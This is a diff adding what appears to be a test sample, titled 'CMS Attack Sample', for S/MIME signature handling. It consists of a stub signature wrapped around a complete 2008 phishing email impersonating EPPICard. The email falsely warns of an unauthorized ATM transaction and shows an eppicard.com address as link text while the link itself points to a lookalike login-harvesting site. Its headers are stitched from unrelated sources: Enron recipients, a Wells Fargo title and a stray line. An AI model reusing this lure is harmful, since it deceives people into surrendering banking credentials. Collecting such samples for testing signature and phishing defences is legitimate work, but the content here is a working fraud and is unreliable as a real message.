@@ -1,0 +1,106 @@
+From: altcap@rogers.com
+To: andy.zipper@enron.com, bob.shults@enron.com, daniel.diamond@enron.com
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----5D710E5192338F8D6E1D1324B6443410"
+This is an S/MIME signed message
+----5D710E5192338F8D6E1D1324B6443410
+0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVERxvoEaZWNaBJjv00008c9c@server.apgintl.local>
+X-OriginalArrivalTime: 08 Jun 2008 11:28:27.0500 (UTC) FILETIME=[C5554AC0:01C8C95A]
+To: undisclosed-recipients:;
+Content-Length: 2516
+Lines: 77
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 769
+
+<html>
+<style type="text/css">
+<!--
+.style1 {
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 9px;
+}
+.style2 {font-size: 9px}
+-->
+</style>
+<body>
+<title>Wells Fargo Letter</title>
+<p>
+  <style type="text/css">
+<!-- .style2 {font-family: Verdana, Arial, Helvetica, sans-serif}
+.style3 {font-family: Arial, Helvetica, sans-serif} -->
+</style>
+  
+  
+  <body>
+  <img src="http://images.aboutus.org/images/6/65/Logo-eppicard-com.gif" border="0"><br>
+  <br>
+  
+  <style type="text/css">
+<!-- .style2 {font-family: "Courier New", Courier, monospace;font-size: 14px;}
+.style3 {font-family: Verdana, Arial, Helvetica, sans-serif}
+.style4 {color: #FF0000;font-size: 10px;font-family: Verdana, Arial, Helvetica, sans-serif;} -->
+</style>
+  
+  <span class="style2">Dear <b>EPPICard</b> customer,<br>
+  <br>
+    
+  We recently reviewed your account, and we suspect an unauthorized ATM based transaction on your account. 
+  Therefore as a preventive measure we have temporary limited your access to sensitive EPPICard account features. 
+  To ensure that your account is not compromised please login to your account, verify your identity 
+  and your online account will be reactived by our system.<br>
+  <br>
+    
+  SERVICE: EPPICard customer services.<br>
+  <br>
+    
+  What you need to do:<br>
+  <br>
+    
+  - Go to <a href="http://www.dcclientmss4500logon.com/eppicardreview/online/index.php">https://www.eppicard.com/gaedcclient/siteLogonClient.recip</a><br>
+  - Enter your User ID and Password<br>
+  - Enter the requested information and your Online Account services will be reactived.<br>
+  <br>
+    
+    
+  Thank you for EPPICard <br>
+  <br>
+    
+  <span class="style4">Note: EPPICard are not liable for any fraudulent charges to their accounts</span><br>
+  <br>
+    
+    
+  <span class="style3">**********************************</span><br>
+    IMPORTANT CUSTOMER SUPPORT INFORMATION<br>
+          <span class="style3">**********************************</span><br>
+  <br>
+    
+  We are committed to delivering your quality service that is reliable and highly secure. This 
+  email is one of many components designed to ensure your information is safeguarded at all times.<br>
+  <br>
+    
+  Please do not reply to this message. For any inquiries, contact Customer Service.<br>
+  <br>
+    
+  Document Reference: (92051201).<br>
+</span></p>
+<p align="center"><span class="style2"><br>
+  
+  
+  <span class="style1">Copyright   2008 EPPICard All rights reserved. Member FDIC.</span></span></p>
+</body>
+</html>
+----5D710E5192338F8D6E1D1324B6443410
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MDQGCSqGSIb3DQEHAqAnMCUCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGgADEA
+----5D710E5192338F8D6E1D1324B6443410
